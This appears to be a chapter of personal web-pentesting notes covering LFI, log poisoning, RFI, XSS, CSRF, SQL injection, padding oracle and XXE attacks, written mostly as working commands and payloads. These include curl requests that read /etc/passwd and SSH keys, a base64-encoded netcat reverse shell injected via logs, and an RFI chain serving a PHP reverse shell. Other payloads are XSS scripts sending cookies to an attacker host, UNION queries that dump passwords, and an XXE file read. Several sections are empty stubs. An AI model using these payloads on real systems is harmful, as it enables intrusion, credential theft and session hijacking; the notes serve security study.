# (PART) Vulnerabilies Assessment{-}

# Searching for exploits {-}

## Exploit database {-}

Exploit database or exploit-db is a website where attackers can find exploits over services in a specific version.

[exploit-db website](https://www.exploit-db.com/)

## Searchsploit {-}

**Searchsploit** is a command line tool directly binded to exploits-db.com that helps attacker find exploits over services in a specific version.

```bash
searchsploit <service name + version>
```

# Web Vulneratilities {-}

## ByPass Login Password vulnerabilites {-}

### strcmp {-}

**strcmp** is a programming error in php when it is used to compare user entries because it's not taking care of
the entry type.

```bash
username=admin&password=admin # -> don't work
username[]=admin&password[]=admin # -> work
```

## LFI (Local File inclusion) {-}

/etc/passwd
/etc/group

```bash
curl -s "http://localhost/example.php?file=/etc/passwd" | grep "sh$"
curl -s "http://localhost/example.php?file=/home/looping/.ssh/id_rsa"
```

/proc/shed_debug
/proc/shedstat
/proc/net/fib_trie

```bash
curl -s "http://localhost/example.php?file=/proc/net/fib_trie" | grep -i "host local" -B 1 | grep -oP '\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}' | sort -u
```

/proc/net/tcp

```bash
for port in $(curl -s "http://localhost/example.php?file=/proc/net/tcp" | awk '{print $2}' | grep -v "local_address" | awk -F ':' '{print $2}' | sort -u); do echo "[$port] -> Port number $(echo "ibase=16; $port" | bc); done

lsof -i:<port>
```

> [ ! ] Note: Be carefull to path traversal ?file=/../../../../../../../etc/passwd  
> [ ! ] Note: Try also null byte and interogation at the end (%00 or ?) at the end -> ../../../etc/passwd%00 or ../../../etc/passwd?

Chrome check file as raw Ctrl+u

## Wrappers {-}

```bash
curl -s "http://localhost/example.php?file=file:///etc/passwd"
```

```bash
curl -s "http://localhost/example.php?file=php://filter/convert.base64-encode/resource=example2.php"

echo "<base64 code>" | base64 -d; echo
```

## Log Poisoning {-}

Log Poisoning allows user to execute command remote system using logs files. This technic comes basicaly after finding a LFI
vulnerability and is used for gaining access to the victim system by generating a reverse shell.

### Apache2 {-}

```bash
curl -s "http://localhost/example.php?file=/var/log/apache2/access.log"

curl -s -H "User-Agent: <?php system('whoami'); ?> "http://localhost/example.php?file=/var/log/apache2/access.log"
```

### ssh logs {-}

```bash
curl -s "http://localhost/example.php?file=/var/log/auth.log"
echo "nc -e /bin/bash 127.0.0.1 443" | base64; echo

#output
bmMgLWUgL2Jpbi9iYXNoIDEyNy4wLjAuMSA0NDMK


ssh '<?php system("echo bmMgLWUgL2Jpbi9iYXNoIDEyNy4wLjAuMSA0NDMK | base64 -d | bash"); ?>'@127.0.0.1

```

## RFI (Remote File inclusion) {-}

**RFI** is a vulnerability similar to the **LFI** but using a necessary third part. Instead of looking for internal files,
**RFI** vulnerability allows the system or the service to look also, throw internet, of files from services located in an external 
Server.

Let's take the example of an existing RFI vulnerability from *gwolle-gb* wordpress plugin:

```bash
wfuzz -c --hc=404 -w /opt/SecLists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt http://127.0.0.1/fuzz

#Output
Payload : "wp-content/plugins/gwolle-gb"

searchsploit gwolle
#Output
WordPress Plugin Gwolle Guestbook 1.5.3 - Remote File inclusion  |  php/webapps/38861.txt

searchsploit -x php/webapps/388861.txt
#Output
HTTP GET parameter "abspath" is not being properly sanitized before being used in PHP require() function. A remote attacker can include a file named 'wp-load.php' from arbitrary remote server and execute its content on the vulnerable web server. In order to do so the attacker needs to place a malicious 'wp-load.php' file into his server document root and includes server's URL into request:
http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website]
```

In this case you can see that because of the fact that this plugin is not properly sanitized, the require method is looking for a wp-load.php file that can come from
another computer.

1. download php reverse shell example  

    ```bash
    cd content
    wget http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz
    tar -xf php-reverse-shell-1.0.tar.gz
    mv php-reverse-shell-1.0/php-reverse-shell.php wp-load.php
    sed -i 's/127.0.0.1/<attacker_ip>/' wp-load.php
    sed -i 's/1234/443/' wp-load.php
    python3 -m http.server 80
    ```

1. listen to port 443  

    ```bash
    nc -nlvp 443
    ```

1. send the **RFI** 

    ```bash
    curl -s "http://127.0.0.1/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://<attacker_ip/"
    ```

**That's it**


## HTML Injection {-}

**HTML Injection** is a vulnerability that allows people to insert, most probably via a input text, a html tag. This vulnerability can
be verified in a forum or a notes application for example by inserting `<h1>test</h1>` or a `<marquee>this note will move</marquee>` and if the
result is interpreted, that means that the application is vulnerable to HTML Injection and most probably to **XSS Injection**

## XSS (Cross site scripting) {-}

**XSS Injection** comes from the family of **HTML Injection** and use the `<script />` tag for using javascript and inject commands via a programming 
language. This technic is commonly used for change session cookies content.

```html
<script>alert(document.cookie)</script>
```

## XSS Blind {-}

**XSS Blind** is the common way to sleal the session cookie of a user by sending the information to a third part server.

1. Attacker create a small web server  

    ```bash
    python3 -m http.server 8080
    ```

1. Attacker put the malicious XSS script on the web app  

    ```html
    <script>document.write('<img src="http://<attacker_ip>:8080/img.jpg?cookie=' + document.cookie + '">')</script>
    ```

1. Read the cookie on the small web server  

    ```bash
    #Output
    10.10.12.24 -- [date] "GET /img.jpg?cookie=PHPSESSID=2qjc9psdroeqb0qcppnqdmhgp8 HTTP/1.1" 404 -
    ```

1. Attacker can now update the cookie with the EditThisCookie chrome extension. 

## XSS By victim operation {-}

1. Attacker create a web server with python

    ```bash
    python3 -m http.server 80
    ```

1. Attacker create a js script 

    ```javascript
    var request = new XMLHttpRequest();
    request.open('GET', 'http://10.10.17.51/?cookie='+document.cookie, true);
    request.send();
    ```

1. Attacker put a malicious XSS script on the web app

    ```bash
    <script src="http://10.10.17.51/pwnd.js"></script>
    ```

1. Read the cookie on the small web server  

    ```bash
    #Output
    10.10.10.154 - - [27/Oct/2021 23:18:07] "GET /pwnd.js HTTP/1.1" 200 -
    10.10.10.154 - - [27/Oct/2021 23:18:07] "GET /?cookie=username=YWRtaW4%3D;%20password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D;%20id=1 HTTP/1.1" 200 -
    ```

## CSRF (Cross-site Request Forgery) {-}

**CSRF** is a vulnerability that allows attacker to send a request for example a form that normaly is send by the method **POST** throw
another method like **GET**. It's commonly used in order to change a password. The attacker is now able to send a link that will change 
automatically the password of a victim.

Imagine that there is a function in a web app that allows user to change their password. The Request in BurpSuite will probably look like that.

```{r, echo = FALSE, fig.cap="csrf post request", out.width="90%"}
knitr::include_graphics("images/csrf-post.png")
```

To check if this web app is vulnerable to **CSRF**, with BurpSuite right click and selecting *change request method* and you will se that the
request has now changed to a **GET** method and looks like the following

```{r, echo = FALSE, fig.cap="csrf updated to GET", out.width="90%"}
knitr::include_graphics("images/csrf-get.png")
```

If this change allows still user to change his password that means that this app is vulnerable to **CSRF** and attacker can send this link to
the victim in order to change his password with the attacker desired password.

> [ ! ] NOTE: In order to send another url text than the normal one, use a URL SHORTENER like bitly or others. 
@S4vitaar Estoy siguiendo tus cursos por el momento youtube de web pentest y tenia una pregunta, se puede hacer un cross site request forgery con un cross site scripting javascript?

## SSRF (Server-Side Request Forgery) {-}

A big difference bitween **CSRF** and **SSRF** is that with **Server-Side Request Forgery**, attacker doesn't need to interact with the victim to exploit the 
vulnerability. Attacker can use this vulnerability to send commands at server level. 

## SQL Injection - Error Based {-}

An **Error based SQL Injection** is a type of sql injection that profit to a syntax error attack type. Attacker can then profit those errors to list priviledge 
informations.

```bash
MySql [database]> select username,password from users where id = 1 ';
#Output
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that correspond to you MySqlDB server version for the right syntax to use near '''' at line 1 
```

> [ ! ] NOTE: The error here comes from the ' at the end of the line.

```{r, echo = FALSE, fig.cap="sql error based on screen", out.width="90%"}
knitr::include_graphics("images/sql-error-based.png")
```

How can Attacker take profit of this vulnerability:

1. List total number of column of the table  

    ```bash
    MySql [database]> select * from users order by 100;
    #Output
    ERROR 1054 (42S22): Unknown column '100' in 'order clause'

    MySql [database]> select * from users order by 4;
    #Output
    +----+----------+----------+---------+  
    | id | username | password | email   |  
    +----+----------+----------+---------+  
    | 2  | zeto     | test1234 | a@a.com |  
    | 3  | rob2     | test3434 | b@b.com |  
    | 1  | arif2    | test2331 | c@c.com |  
    +----+----------+----------+---------+  
    ```
    ```{r, echo = FALSE, fig.cap="sql error based order by 100", out.width="90%"}
    knitr::include_graphics("images/sql-error-based-url-by-100.png")
    ```

1. Get column names

    ```bash
    MySql [database]> select * from users union select 1,2,3,4;
    #Output
    +----+----------+----------+---------+  
    | id | username | password | email   |  
    +----+----------+----------+---------+  
    | 2  | zeto     | test1234 | a@a.com |  
    | 3  | rob2     | test3434 | b@b.com |  
    | 1  | arif2    | test2331 | c@c.com |  
    | 1  | 2        | 3        | 4       |  
    +----+----------+----------+---------+  
    # Also possible with strings and functions

    MySql [database]> select * from users union select 1,"test",3,database();
    #Output
    +----+----------+----------+---------+  
    | id | username | password | email   |  
    +----+----------+----------+---------+  
    | 2  | zeto     | test1234 | a@a.com |  
    | 3  | rob2     | test3434 | b@b.com |  
    | 1  | arif2    | test2331 | c@c.com |  
    | 1  | test     | 3        | database|  
    +----+----------+----------+---------+    
    ```

    Usefull functions to be used in order to retrieve relevant informations:  
    - database()
    - user()
    - load_file('/etc/passwd')


1. Get all the table names from database  

    ```bash
    MySql [database]> select * from users union select table_name,2,3,4 from information_schema.tables where table_schema = "database";
    ```

1. Get all databases  

    ```bash
    MySql [database]> select * from users union select schema_name,2,3,4 from information_schema.schemata;
    MySql [database]> select * from users union select schema_name,2,3,4 from information_schema.schemata limit 1,1; #show the first database
    MySql [database]> select * from users union select schema_name,2,3,4 from information_schema.schemata limit 2,1; #show the second database
    ```

1. Get Columns name of a table  

    ```bash
    MySql [database]> select * from users union select column_name,2,3,4 from information_schema.columns where table_schema = "database" and table_name = "users";
    ```

1. Display User and Passwords  

    ```bash
    MySql [database]> select * from users union select concat(username,0x3a,password),2,3,4 from database.users;
    ```

    or with group concat

    ```bash
    MySql [database]> select * from users union select group_concat(username,0x3a,password),2,3,4 from database.users;
    ```


> [ ! ] NOTE: In a web app you might need to finish the sql injection by **-- -**

> [ ! ] NOTE: sometimes quotes or double quotes can not be used in web services url, but you can bypass that by using hexadecimal 
> value `echo "database" | xxd -ps` -> 64617461626173650a so table_schema = "database" is the same as table_schema = 0x6461746162617365

## SQL Injection - Time Based {-}

**SQL Injection time based** is a technic that attacker can use when the database is not visiblie (Blind) in the web application. The purpose is the same as the
sql injection error based but needs a sleep(5) function to guess the searched values.

## SQL Injection - Boolean Based {-}

**SQL Injection boolean based** is a kind of **error based** technic. The difference here is that the attacker is not looking at the information because
it is not revealed by the web app. The only thing that the attacker know is if it's sql command get an error or not. As the time **time based** technic, 
the attacker use that to guess the searched value.
In this case, **SQLMap** is usefull.

## SQLMap {-}

**SQLMap** is an automatic tool that perform sql injections.

```bash
sqlmap -u http://10.124.211.96/details.php?id=2
# SQLMap identify the param id as injectable
sqlmap -u http://10.124.211.96/details.php?id=2 --tables
# SQLMap get the tables and db information
sqlmap -u http://10.124.211.96/details.php?id=2 -D db -T users --dump
# SQLMap dump the users table


```

## Padding Oracle Attack (Padbuster) {-}

1. Recover cookie session and name
1. Decode cookie with padbuster  

    ```bash
    padbuster http://<website_url>/login.php p4YaK6FAadDiK24eOGcORpxvxiAchu%2Fy 8 -cookie "auth=p4YaK6FAadDiK24eOGcORpxvxiAchu%2Fy" -encoding 0
    ```

> [ ! ] NOTE: If you see that the webapp is vulnerable to padding oracle attack, that the user *admin* is valid and you see that the webapp have 
a Registration page you can, you can put as a username *admin=* and you will be logged as admin manualy.


## Padding Oracle Attack (Bit Flipper Attack - BurpSuite) {-}

The **Bit Flipper attack** is an attack that takes the cookie of a user created with a very similar name as the victim name and flip Bits in order to retrieve the
desired session cookie

1. create a user name very similar as the victim (in this case bdmin for admin)

    ```{r, echo = FALSE, fig.cap="sql error based order by 100", out.width="90%"}
    knitr::include_graphics("images/bit-flip-registration.png")
    ```

1. check the session cookie of user bdmin with BurpSuite  

    ```{r, echo = FALSE, fig.cap="sql error based order by 100", out.width="90%"}
    knitr::include_graphics("images/bit-flip-checkcookie.png")
    ```

1. Ctrl+i to emit that to the BurpSuite intruder and go to intruder Positions to do a Sniper Attack  

    ```{r, echo = FALSE, fig.cap="sql error based order by 100", out.width="90%"}
    knitr::include_graphics("images/bit-flip-sniperattack.png")
    ```

1. Go to Payloads and select Bit flipper in payload type, Literal value in Format original data, select all the bits and uncheck Url encode these characters  

    ```{r, echo = FALSE, fig.cap="sql error based order by 100", out.width="90%"}
    knitr::include_graphics("images/bit-flip-payloadoption.png")
    ```

1. Go to option and add a Grep Extract  
    - Add Grep Extract  

        ```{r, echo = FALSE, fig.cap="sql error based order by 100", out.width="90%"}
        knitr::include_graphics("images/bit-flip-addgrepextract.png")
        ```
    
    - Fetch Response  

        ```{r, echo = FALSE, fig.cap="sql error based order by 100", out.width="90%"}
        knitr::include_graphics("images/bit-flip-fetchresponse.png")
        ```
    
    - Generate regexp by selecting the output you want to analyse  

        ```{r, echo = FALSE, fig.cap="sql error based order by 100", out.width="90%"}
        knitr::include_graphics("images/bit-flip-selectresponse.png")
        ```

1. Click on start attack button  

    ```{r, echo = FALSE, fig.cap="sql error based order by 100", out.width="90%"}
    knitr::include_graphics("images/bit-flip-startattack.png")
    ```

1. Find and select a row where you see *You are currently logged in as admin!*  


You can then copy the payload and past it in a EditThisCookie tool.

## ShellShock {-}

## XXE (XML External Entity Injection) {-}

**XML External Entity Injection** is usualy seen when the webapp try to convert the entries of the user to an XML syntax
before sending that to the server. The problem with this technic is that the attacker can use the power of XML (with its entities)
to take profit of the system and get a **LFI**

```xml
<?xml version"1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>
<order>
    <quantity>3</quantity>
    <item>&xxe;</item>
    <address>17th Estate, CA</address>
</order>
```

As it works like a **LFI**, attacker can check for sensitive files like `id_rsa`

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///home/roosa/.ssh/id_rsa" >]>
<elements>
    <Author>&xxe;</Author>
    <Subject>EEEEEEEEE</Subject>
    <Content>EEEAEAEAAAEAAEAE</Content>
</elements>
```

## Blind XXE {-}

## Domain Zone Transfer {-}

## Insecure Deserialization {-}

## Type Juggling {-}

## SSTI {-}

Flask/Jinja2 -> Server Side Template Injection
